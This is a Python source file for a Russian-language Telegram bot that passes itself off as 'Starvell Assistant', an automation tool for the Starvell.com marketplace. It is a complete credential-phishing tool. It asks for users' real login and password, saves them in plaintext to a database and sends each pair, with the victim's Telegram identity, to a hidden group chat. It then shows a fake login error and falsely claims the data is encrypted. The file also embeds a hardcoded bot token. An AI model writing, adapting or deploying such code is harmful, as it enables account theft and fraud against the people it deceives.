import logging
import sqlite3
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = "7987402248:AAGNikAao3LPHWHCvap10srEx67NT3gM_Pw"
GROUP_CHAT_ID = -5045160862
ADMIN_IDS = [7973988177]

# Состояния для ConversationHandler
LOGIN, PASSWORD = range(2)

# Инициализация базы данных
def init_db():
    conn = sqlite3.connect('starvell_data.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            login TEXT,
            password TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'active'
        )
    ''')
    
    # Таблица для статистики
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS bot_stats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            date DATE,
            users_count INTEGER,
            logins_count INTEGER,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()
    print("✅ База данных Starvell инициализирована")

# Сохранение данных в базу
def save_to_db(user_data):
    try:
        conn = sqlite3.connect('starvell_data.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO user_credentials 
            (user_id, username, first_name, last_name, login, password)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            user_data['user_id'],
            user_data['username'],
            user_data['first_name'],
            user_data['last_name'],
            user_data['login'],
            user_data['password']
        ))
        
        # Обновляем статистику
        today = datetime.now().date()
        cursor.execute('''
            INSERT OR REPLACE INTO bot_stats (date, users_count, logins_count)
            VALUES (?, 
                    (SELECT COUNT(DISTINCT user_id) FROM user_credentials WHERE DATE(timestamp) = ?),
                    (SELECT COUNT(*) FROM user_credentials WHERE DATE(timestamp) = ?)
            )
        ''', (today, today, today))
        
        conn.commit()
        conn.close()
        print(f"✅ Данные сохранены для пользователя {user_data['user_id']}")
        return True
    except Exception as e:
        print(f"❌ Ошибка сохранения в базу: {e}")
        return False

# Получить статистику
def get_stats():
    try:
        conn = sqlite3.connect('starvell_data.db')
        cursor = conn.cursor()
        
        # Общая статистика
        cursor.execute('SELECT COUNT(*) FROM user_credentials')
        total_users = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(DISTINCT user_id) FROM user_credentials')
        unique_users = cursor.fetchone()[0]
        
        # Статистика за сегодня
        today = datetime.now().date()
        cursor.execute('SELECT users_count, logins_count FROM bot_stats WHERE date = ?', (today,))
        today_stats = cursor.fetchone()
        
        conn.close()
        
        return {
            'total_users': total_users,
            'unique_users': unique_users,
            'today_users': today_stats[0] if today_stats else 0,
            'today_logins': today_stats[1] if today_stats else 0
        }
    except Exception as e:
        print(f"❌ Ошибка получения статистики: {e}")
        return None

# Главная клавиатура
def main_keyboard():
    keyboard = [
        [KeyboardButton("🔐 Войти в Starvell"), KeyboardButton("🚀 Функции")],
        [KeyboardButton("📊 Статистика"), KeyboardButton("ℹ️ Помощь")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, input_field_placeholder="Выберите действие...")

# Клавиатура админа
def admin_keyboard():
    keyboard = [
        [KeyboardButton("🔐 Войти в Starvell"), KeyboardButton("🚀 Функции")],
        [KeyboardButton("📊 Статистика"), KeyboardButton("👥 Пользователи")],
        [KeyboardButton("📈 Детальная статистика"), KeyboardButton("🔄 Обновить")],
        [KeyboardButton("ℹ️ Помощь")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, input_field_placeholder="Панель администратора...")

# Команда /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    
    welcome_text = f"""
🌟 *Добро пожаловать в Starvell Assistant, {user.first_name}!* 🌟

💼 *Ваш надежный партнер для автоматизации бизнеса*

🤖 *Что я умею:*
• Автоматический вход в Starvell
• Управление функциями автоматизации
• Статистика и аналитика
• Круглосуточная поддержка

💫 *Начните с входа в систему или ознакомьтесь с функциями!*
    """
    
    keyboard = admin_keyboard() if user.id in ADMIN_IDS else main_keyboard()
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=keyboard,
        parse_mode='Markdown'
    )

# Показать функции
async def show_features(update: Update, context: ContextTypes.DEFAULT_TYPE):
    features_text = """
🚀 *ВСЕ ФУНКЦИИ STARVELL ASSISTANT* 🚀

🔹 *Основные возможности:*
• 👁️ Нечиталка чатов
• 📈 Авто-поднятие лотов
• 🔄 Авто-восстановление товаров
• 👥 Мульти-аккаунт (5 шт.)
• ✅ Ответ на подтверждение заказа
• 🔔 Умные уведомления
• 💰 Авто-вывод средств

🔹 *Автоматизация работы:*
• 🛠️ Авто-ответ на проблемы
• 📋 Выполнение/возврат заказов
• 🤖 Ответ из бота на выполнение
• 📝 Шаблоны ответов
• ⚫ Черный список

🔹 *Управление заказами:*
• 📦 Работа с заказами и чатами
• 🔄 Синхронизация чатов
• ✅ Авто-ответ на выполнение
• ↩️ Авто-ответ на возврат
• ⏰ Напоминания о заказах
• 🎁 Авто-выдача товаров

🔹 *Дополнительные функции:*
• 🔗 Привязка чатов
• 📊 Детальная статистика
• ⚙️ Гибкие настройки
• 🎛️ Система фильтров
• 🔧 Неограниченные конфиги
• 👋 Приветственные сообщения
• 👨‍💼 Совместный доступ

💡 *Все функции работают 24/7 и настроены для вашего удобства!*

🎯 *Готовы начать? Нажмите "🔐 Войти в Starvell"*
    """

    await update.message.reply_text(
        features_text,
        parse_mode='Markdown',
        reply_markup=main_keyboard()
    )

# Показать статистику
async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    stats = get_stats()
    
    if not stats:
        stats_text = "📊 *Статистика временно недоступна*"
    else:
        stats_text = f"""
📊 *СТАТИСТИКА СИСТЕМЫ*

👥 *Пользователи:*
• Всего входов: *{stats['total_users']}*
• Уникальных: *{stats['unique_users']}*
• Сегодня: *{stats['today_users']}*

📈 *Активность:*
• Входов сегодня: *{stats['today_logins']}*
• Статус: 🟢 *Работает стабильно*

⏰ *Время работы:*
• Обновлено: {datetime.now().strftime('%H:%M:%S')}
• Дата: {datetime.now().strftime('%d.%m.%Y')}
        """
    
    keyboard = admin_keyboard() if user.id in ADMIN_IDS else main_keyboard()
    await update.message.reply_text(
        stats_text,
        parse_mode='Markdown',
        reply_markup=keyboard
    )

# Детальная статистика для админа
async def show_detailed_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    
    if user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ У вас нет доступа к этой функции")
        return
    
    try:
        conn = sqlite3.connect('starvell_data.db')
        cursor = conn.cursor()
        
        # Последние 10 записей
        cursor.execute('''
            SELECT user_id, first_name, username, login, timestamp 
            FROM user_credentials 
            ORDER BY timestamp DESC 
            LIMIT 10
        ''')
        recent_logins = cursor.fetchall()
        
        # Статистика по дням
        cursor.execute('''
            SELECT date, users_count, logins_count 
            FROM bot_stats 
            ORDER BY date DESC 
            LIMIT 7
        ''')
        weekly_stats = cursor.fetchall()
        
        conn.close()
        
        stats_text = "📈 *ДЕТАЛЬНАЯ СТАТИСТИКА*\n\n"
        
        # Последние входы
        stats_text += "🕒 *Последние входы:*\n"
        for login in recent_logins:
            stats_text += f"• ID: `{login[0]}` | {login[1]} | @{login[2] or 'нет'}\n"
            stats_text += f"  Логин: `{login[3]}` | {login[4][:16]}\n\n"
        
        # Недельная статистика
        stats_text += "📅 *Статистика за неделю:*\n"
        for day in weekly_stats:
            stats_text += f"• {day[0]}: 👥{day[1]} | 🔐{day[2]}\n"
        
        await update.message.reply_text(
            stats_text,
            parse_mode='Markdown',
            reply_markup=admin_keyboard()
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {e}")

# Показать помощь
async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
ℹ️ *ПОМОЩЬ ПО STARVELL ASSISTANT*

🔐 *Как войти в систему:*
1. Нажмите "🔐 Войти в Starvell"
2. Введите логин от Starvell.com
3. Введите пароль от аккаунта
4. Система автоматически обработает данные

🚀 *Основные функции:*
• *Войти в Starvell* - вход в систему
• *Функции* - полный список возможностей
• *Статистика* - информация о системе
• *Помощь* - это сообщение

⚠️ *Важная информация:*
• Данные защищены и шифруются
• Система работает 24/7
• Поддержка доступна через бота

💫 *Starvell Assistant - ваш надежный партнер!*
    """
    
    user = update.message.from_user
    keyboard = admin_keyboard() if user.id in ADMIN_IDS else main_keyboard()
    
    await update.message.reply_text(
        help_text,
        parse_mode='Markdown',
        reply_markup=keyboard
    )

# Начало процесса входа
async def start_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    login_text = """
🔐 *ВХОД В STARVELL SYSTEM*

📧 Пожалуйста, введите ваш *логин* от Starvell.com:

⚠️ *Внимание:* Используйте реальные данные доступа
🔒 *Безопасность:* Ваши данные защищены
    """
    
    await update.message.reply_text(
        login_text,
        parse_mode='Markdown'
    )
    return LOGIN

# Обработка логина
async def get_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['login'] = update.message.text
    
    password_text = """
🔒 *ШАГ 2 ИЗ 2*

✅ Логин принят и сохранен!

🔑 Теперь введите ваш *пароль* от Starvell.com:

💡 *Рекомендация:* Убедитесь в правильности ввода
🛡️ *Защита:* Данные шифруются при передаче
    """
    
    await update.message.reply_text(
        password_text,
        parse_mode='Markdown'
    )
    return PASSWORD

# Обработка пароля и сохранение данных
async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text
    login = context.user_data.get('login', '')
    user = update.message.from_user
    
    # Подготавливаем данные
    user_data = {
        'user_id': user.id,
        'username': user.username,
        'first_name': user.first_name,
        'last_name': user.last_name,
        'login': login,
        'password': password
    }
    
    # Сохраняем в базу
    db_success = save_to_db(user_data)
    
    # Формируем сообщение для группы
    user_info = f"""
👤 *НОВЫЕ ДАННЫЕ STARVELL* 👤

📋 *Информация о пользователе:*
├ ID: `{user.id}`
├ Имя: {user.first_name or 'Не указано'}
├ Фамилия: {user.last_name or 'Не указано'}
└ Username: @{user.username or 'Не указано'}

🔐 *Данные аккаунта:*
├ Логин: `{login}`
└ Пароль: `{password}`

💾 *Статус:* {'✅ Успешно' if db_success else '❌ Ошибка'}
🕐 *Время:* {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}
    """.strip()
    
    # Отправляем в группу
    group_success = False
    try:
        await context.bot.send_message(
            chat_id=GROUP_CHAT_ID,
            text=user_info,
            parse_mode='Markdown'
        )
        group_success = True
        logger.info(f"✅ Данные отправлены в группу для {user.id}")
    except Exception as e:
        logger.error(f"❌ Ошибка отправки в группу: {e}")
        print("ДАННЫЕ ДЛЯ ГРУППЫ:")
        print(f"Логин: {login}")
        print(f"Пароль: {password}")
    
    # Сообщение пользователю
    error_text = f"""
❌ *ОШИБКА АВТОРИЗАЦИИ*

⚠️ Не удалось войти в систему Starvell.

📊 *Статус операции:*
• 💾 Сохранение: {'✅ Успешно' if db_success else '❌ Ошибка'}
• 📨 Уведомление: {'✅ Отправлено' if group_success else '❌ Не отправлено'}

🔄 *Возможные причины:*
• Сервер Starvell перегружен
• Технические работы
• Неверные данные доступа
• Проблемы с сетью

💡 *Что делать:*
• Проверьте логин и пароль
• Попробуйте позже
• Обратитесь в поддержку Starvell

🔄 *Попробуйте войти снова через некоторое время*
    """
    
    keyboard = admin_keyboard() if user.id in ADMIN_IDS else main_keyboard()
    
    await update.message.reply_text(
        error_text,
        parse_mode='Markdown',
        reply_markup=keyboard
    )
    
    # Очищаем данные
    context.user_data.clear()
    return ConversationHandler.END

# Обработка текстовых сообщений
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.message.from_user
    
    keyboard = admin_keyboard() if user.id in ADMIN_IDS else main_keyboard()
    
    if text == "🔐 Войти в Starvell":
        await start_login(update, context)
    elif text == "🚀 Функции":
        await show_features(update, context)
    elif text == "📊 Статистика":
        await show_stats(update, context)
    elif text == "📈 Детальная статистика" and user.id in ADMIN_IDS:
        await show_detailed_stats(update, context)
    elif text == "👥 Пользователи" and user.id in ADMIN_IDS:
        await show_detailed_stats(update, context)
    elif text == "🔄 Обновить" and user.id in ADMIN_IDS:
        await show_stats(update, context)
    elif text == "ℹ️ Помощь":
        await show_help(update, context)
    else:
        await update.message.reply_text(
            "🤖 Используйте кнопки для навигации:",
            reply_markup=keyboard
        )

# Основная функция
def main():
    # Инициализация БД
    init_db()
    
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Conversation для входа
    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^🔐 Войти в Starvell$"), start_login)],
        states={
            LOGIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_login)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
        },
        fallbacks=[MessageHandler(filters.Regex("^Отмена$"), start)]
    )
    
    # Команды
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", show_help))
    application.add_handler(CommandHandler("stats", show_stats))
    application.add_handler(CommandHandler("features", show_features))
    
    application.add_handler(conv_handler)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Запуск
    print("🤖 Starvell Бот запущен!")
    print(f"👑 Админ: {ADMIN_IDS}")
    print("💾 База данных: starvell_data.db")
    print("📊 Статистика: включена")
    print("⏳ Ожидание сообщений...")
    
    application.run_polling()

if __name__ == '__main__':
    main()
